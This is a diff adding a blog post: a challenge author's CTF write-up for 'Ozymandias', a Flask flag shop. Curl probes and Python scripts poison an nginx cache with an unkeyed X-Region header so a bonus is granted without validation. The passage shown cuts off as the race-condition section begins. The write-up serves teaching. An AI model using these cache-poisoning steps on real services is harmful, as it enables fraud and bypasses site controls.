@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Cybears ctf web/ozymandias - My Personal Blog</title><meta name="Description" content="This is my personal blog"><meta property="og:url" content="http://localhost:1313/blog/posts/cybears_ctf_web_ozymandias/">
+  <meta property="og:site_name" content="My Personal Blog">
+  <meta property="og:title" content="Cybears ctf web/ozymandias">
+  <meta property="og:description" content="Ozymandias CTF Challenge Writeup Challenge: Ozymandias
+Event: Cybears CTF
+Category: Web
+Difficulty: Medium
+Source Code: https://github.com/F0DH1L/cybears_ctf_2k25/ozymandias
+I created this challenge for Cybears CTF, a Capture The Flag competition focused on the Africa region. The event brought together many talented teams from across the continent, making it an exciting competition with high-quality participation.
+A Flask web application that requires exploiting a cache poisoning vulnerability combined with a race condition to obtain the premium flag without paying for it.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-27T18:57:06+01:00">
+    <meta property="article:modified_time" content="2025-12-27T18:57:06+01:00">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Web Security">
+    <meta property="article:tag" content="Cybears_ctf">
+    <meta property="article:tag" content="My_challenges">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Cybears ctf web/ozymandias">
+  <meta name="twitter:description" content="Ozymandias CTF Challenge Writeup Challenge: Ozymandias
+Event: Cybears CTF
+Category: Web
+Difficulty: Medium
+Source Code: https://github.com/F0DH1L/cybears_ctf_2k25/ozymandias
+I created this challenge for Cybears CTF, a Capture The Flag competition focused on the Africa region. The event brought together many talented teams from across the continent, making it an exciting competition with high-quality participation.
+A Flask web application that requires exploiting a cache poisoning vulnerability combined with a race condition to obtain the premium flag without paying for it.">
+<meta name="application-name" content="My Personal Blog">
+<meta name="apple-mobile-web-app-title" content="My Personal Blog">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/blog/posts/cybears_ctf_web_ozymandias/" /><link rel="prev" href="http://localhost:1313/blog/posts/cybears_ctf_web_gear5/" /><link rel="next" href="http://localhost:1313/blog/posts/cybears_ctf_web_file_manager/" /><link rel="stylesheet" href="/blog/css/style.min.css"><link rel="preload" href="/blog/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/blog/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/blog/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/blog/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Cybears ctf web/ozymandias",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/blog\/posts\/cybears_ctf_web_ozymandias\/"
+        },"genre": "posts","keywords": "ctf, web security, cybears_ctf, my_challenges","wordcount":  1670 ,
+        "url": "http:\/\/localhost:1313\/blog\/posts\/cybears_ctf_web_ozymandias\/","datePublished": "2025-12-27T18:57:06+01:00","dateModified": "2025-12-27T18:57:06+01:00","license": "2025 F0DH1L","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "F0DH1L"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/blog/" title="My Personal Blog">F0DH1L Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/blog/posts/"> Posts </a><a class="menu-item" href="/blog/tags/"> Tags </a><a class="menu-item" href="/blog/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/blog/" title="My Personal Blog">F0DH1L Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/blog/posts/" title="">Posts</a><a class="menu-item" href="/blog/tags/" title="">Tags</a><a class="menu-item" href="/blog/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Cybears ctf web/ozymandias</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/blog/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>F0DH1L</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-27">2025-12-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1670 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#tldr">TL;DR</a></li>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#application-architecture">Application Architecture</a>
+      <ul>
+        <li><a href="#flask-application-port-50008088">Flask Application (Port 5000/8088)</a></li>
+        <li><a href="#static-server-nginx">Static Server (Nginx)</a></li>
+        <li><a href="#bonus-claim-mechanism">Bonus Claim Mechanism</a></li>
+      </ul>
+    </li>
+    <li><a href="#vulnerability-analysis">Vulnerability Analysis</a>
+      <ul>
+        <li><a href="#vulnerability-1-cache-poisoning-via-unkeyed-headers">Vulnerability #1: Cache Poisoning via Unkeyed Headers</a></li>
+        <li><a href="#vulnerability-2-race-condition-in-bonus-claims">Vulnerability #2: Race Condition in Bonus Claims</a></li>
+      </ul>
+    </li>
+    <li><a href="#the-path-to-the-flag">The Path to the Flag</a>
+      <ul>
+        <li><a href="#building-the-full-exploit">Building the Full Exploit</a></li>
+        <li><a href="#building-the-full-exploit-1">Building the Full Exploit</a></li>
+        <li><a href="#flag">Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#summary-of-the-complete-exploit-chain">Summary of the Complete Exploit Chain</a></li>
+    <li><a href="#key-takeaways">Key Takeaways</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="ozymandias-ctf-challenge-writeup">Ozymandias CTF Challenge Writeup</h1>
+<p><strong>Challenge:</strong> Ozymandias<br>
+<strong>Event:</strong> Cybears CTF<br>
+<strong>Category:</strong> Web<br>
+<strong>Difficulty:</strong> Medium<br>
+<strong>Source Code:</strong> <a href="https://github.com/F0DH1L/cybears_ctf_2k25/ozymandias" target="_blank" rel="noopener noreffer ">https://github.com/F0DH1L/cybears_ctf_2k25/ozymandias</a></p>
+<p>I created this challenge for Cybears CTF, a Capture The Flag competition focused on the Africa region. The event brought together many talented teams from across the continent, making it an exciting competition with high-quality participation.</p>
+<p>A Flask web application that requires exploiting a cache poisoning vulnerability combined with a race condition to obtain the premium flag without paying for it.</p>
+<hr>
+<h2 id="tldr">TL;DR</h2>
+<p>This challenge chains two main vulnerabilities to achieve the goal:</p>
+<ol>
+<li><strong>Web Cache Poisoning</strong> - Using unkeyed HTTP headers to poison the cache and bypass region restrictions</li>
+<li><strong>Race Condition</strong> - Exploiting concurrent bonus claims to accumulate enough balance for the premium flag</li>
+</ol>
+<hr>
+<p>Now lock your seatbelts and let&rsquo;s start</p>
+<p><img
+        class="lazyload"
+        src="/blog/svg/loading.min.svg"
+        data-src="/blog/images/cybears_ctf_web_ozymandias/say_my_name.gif"
+        data-srcset="/blog/images/cybears_ctf_web_ozymandias/say_my_name.gif, /blog/images/cybears_ctf_web_ozymandias/say_my_name.gif 1.5x, /blog/images/cybears_ctf_web_ozymandias/say_my_name.gif 2x"
+        data-sizes="auto"
+        alt="/blog/images/cybears_ctf_web_ozymandias/say_my_name.gif"
+        title="say my name" /></p>
+<hr>
+<h2 id="overview">Overview</h2>
+<p><strong>Ozymandias</strong> is a &ldquo;Flag Shop&rdquo; web application where users can:</p>
+<ul>
+<li>Register and login to the platform</li>
+<li>Claim a first-time bonus (restricted by region validation)</li>
+<li>Purchase flags using their account balance</li>
+<li>The goal is to purchase the expensive &ldquo;Heisenberg&rdquo; flag worth $99.99</li>
+</ul>
+<p>The application consists of:</p>
+<ol>
+<li><strong>Flask Backend</strong> (Python) - Handles user authentication, bonus claims, and flag purchases</li>
+<li><strong>Static Server</strong> (Nginx) - Serves static files including a <code>locations.js</code> file used for region validation</li>
+<li><strong>SQLite Database</strong> - Stores user data and purchase history</li>
+</ol>
+<hr>
+<h2 id="application-architecture">Application Architecture</h2>
+<h3 id="flask-application-port-50008088">Flask Application (Port 5000/8088)</h3>
+<p>The main application has these key endpoints:</p>
+<ul>
+<li><code>/register</code> - User registration</li>
+<li><code>/login</code> - User authentication</li>
+<li><code>/claim-bonus</code> - Claims a $10 first-time bonus (with region validation)</li>
+<li><code>/purchase</code> - Purchase flags with account balance</li>
+<li><code>/profile</code> - View purchase history</li>
+</ul>
+<h3 id="static-server-nginx">Static Server (Nginx)</h3>
+<ul>
+<li>Serves static files at <code>http://nginx:80/static</code></li>
+<li>Has a caching layer for performance</li>
+<li>Key file: <code>/static/js/locations.js</code> - contains valid region codes</li>
+</ul>
+<h3 id="bonus-claim-mechanism">Bonus Claim Mechanism</h3>
+<p>The <code>/claim-bonus</code> endpoint is the heart of this challenge. Let&rsquo;s examine its logic:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/claim-bonus&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@login_required</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">claim_bonus</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">location</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;location&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Fetches locations.js with X-Region header</span>
+</span></span><span class="line"><span class="cl">    <span class="n">locations_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">STATIC_SERVER_URL</span><span class="si">}</span><span class="s2">/js/locations.js?u=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;X-Region&#34;</span><span class="p">:</span> <span class="s2">&#34;US-NYC&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">locations_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">503</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Service unavailable - grants bonus without validation!</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="s1">&#39;bonus_claimed&#39;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;First time bonus already claimed!&#39;</span><span class="p">}),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">locations_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;update users set balance = balance + 10.0, bonus_claimed = TRUE where id = ? &#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">],))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Normal flow - validates location from locations.js</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Parses locations.js and checks if location is valid</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Only grants bonus if bonus_claimed = FALSE</span></span></span></code></pre></div></div>
+<p>The critical observation here is the <strong>two different code paths</strong>:</p>
+<ol>
+<li>When <code>locations.js</code> returns 503 → Bonus is granted <strong>without proper transaction safety</strong></li>
+<li>When <code>locations.js</code> returns 200 → Bonus is granted using a proper atomic SQL UPDATE</li>
+</ol>
+<hr>
+<h2 id="vulnerability-analysis">Vulnerability Analysis</h2>
+<h3 id="vulnerability-1-cache-poisoning-via-unkeyed-headers">Vulnerability #1: Cache Poisoning via Unkeyed Headers</h3>
+<p>The static server (Nginx) has a caching mechanism. When we examine the bonus claim flow, we see:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">locations_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">STATIC_SERVER_URL</span><span class="si">}</span><span class="s2">/js/locations.js?u=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;X-Region&#34;</span><span class="p">:</span> <span class="s2">&#34;US-NYC&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">locations_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>The application sends an <code>X-Region</code> header to fetch <code>locations.js</code>. But is this header part of the cache key?</p>
+<p><strong>Understanding the Cache Key:</strong></p>
+<p>Since we didn&rsquo;t have access to the cache configuration, I needed to understand how the cache key was constructed. Let me show you how I tested this systematically.</p>
+<p>First, let&rsquo;s test if query parameters are part of the cache key:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Request 1: Initial request</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;http://target/static/js/locations.js?test=value1&#34;</span> -H <span class="s2">&#34;X-Region: header1&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Request 2: Same URL, different header</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;http://target/static/js/locations.js?test=value1&#34;</span> -H <span class="s2">&#34;X-Region: header2&#34;</span></span></span></code></pre></div></div>
+<p>If Request 2 returns the same response as Request 1 (cached), then query params are in the cache key but <code>X-Region</code> is not.</p>
+<p>Testing the <code>User-Agent</code> header:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Request 1</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;http://target/static/js/locations.js&#34;</span> -H <span class="s2">&#34;User-Agent: TestAgent1&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Request 2 - Different User-Agent</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;http://target/static/js/locations.js&#34;</span> -H <span class="s2">&#34;User-Agent: TestAgent2&#34;</span></span></span></code></pre></div></div>
+<p>If both requests return different responses (or cache misses), then <code>User-Agent</code> is part of the cache key.</p>
+<p>After this methodical testing, I confirmed:</p>
+<ul>
+<li>✅ Query parameters - <strong>part of the cache key</strong></li>
+<li>✅ User-Agent header - <strong>part of the cache key</strong></li>
+<li>✅ URL path - <strong>part of the cache key</strong></li>
+<li>❌ <code>X-Region</code> header - <strong>NOT part of the cache key</strong></li>
+</ul>
+<p>The <code>X-Region</code> header was the unkeyed input! Now let&rsquo;s test if we can exploit it:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 1: Send a request with X-Region that might cause an error</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;http://target/static/js/locations.js?u=testuser&#34;</span> -H <span class="s2">&#34;X-Region: INVALID-REGION&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 2: Request the same URL without the header</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;http://target/static/js/locations.js?u=testuser&#34;</span></span></span></code></pre></div></div>
+<p>If the second request returns the error response from the first request, we&rsquo;ve successfully poisoned the cache!</p>
+<p><strong>Finding the Blocked Region:</strong></p>
+<p>Next, I needed to find which region codes would trigger a 503 error response. Let&rsquo;s test systematically:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Testing script</span>
+</span></span><span class="line"><span class="cl"><span class="n">regions_to_test</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;US-NYC&#34;</span><span class="p">,</span>  <span class="c1"># United States - New York</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;EU-LON&#34;</span><span class="p">,</span>  <span class="c1"># Europe - London  </span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;CN-BEI&#34;</span><span class="p">,</span>  <span class="c1"># China - Beijing</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;RU-MOW&#34;</span><span class="p">,</span>  <span class="c1"># Russia - Moscow</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;IR-TEH&#34;</span><span class="p">,</span>  <span class="c1"># Iran - Tehran</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;KP-PYO&#34;</span><span class="p">,</span>  <span class="c1"># North Korea - Pyongyang</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">region</span> <span class="ow">in</span> <span class="n">regions_to_test</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;X-Region&#34;</span><span class="p">:</span> <span class="n">region</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/static/js/locations.js&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">region</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">503</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;✓ Found blocked region: </span><span class="si">{</span><span class="n">region</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span></span></span></code></pre></div></div>
+<p>Running this script:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>US-NYC: 200
+EU-LON: 200
+CN-BEI: 200
+RU-MOW: 503
+✓ Found blocked region: RU-MOW</code></pre></div>
+<p>Perfect! <code>RU-MOW</code> (Russia - Moscow) returns a 503 Service Unavailable response. Now we have everything we need for the cache poisoning attack!</p>
+<p><strong>The Attack:</strong></p>
+<ol>
+<li>Send a request to <code>/static/js/locations.js?u=victim_username</code> with <code>X-Region: RU-MOW</code> (the blocked region we discovered)</li>
+<li>The static server caches the 503 error response for this URL</li>
+<li>When the application tries to validate the location for this user, it gets the cached 503 response</li>
+<li>The bonus is granted <strong>without validation</strong>!</li>
+</ol>
+<p>Let&rsquo;s look at the solve script:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">poison_the_cache</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;python-requests/2.32.2&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;X-Region&#34;</span><span class="p">:</span> <span class="s2">&#34;RU-MOW&#34;</span>  <span class="c1"># The blocked region we found through testing</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}{</span><span class="n">static_path</span><span class="si">}</span><span class="s2">?u=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>By sending <code>X-Region: RU-MOW</code>, we poison the cache for our specific username parameter. Now when the application validates our bonus claim, it receives a 503 status code!</p>
+<h3 id="vulnerability-2-race-condition-in-bonus-claims">Vulnerability #2: Race Condition in Bonus Claims</h3>
+<p>Now that we can trigger the 503 code path, let&rsquo;s examine it more carefully:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">503</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;SELECT * FROM users WHERE id = ?&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">],)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
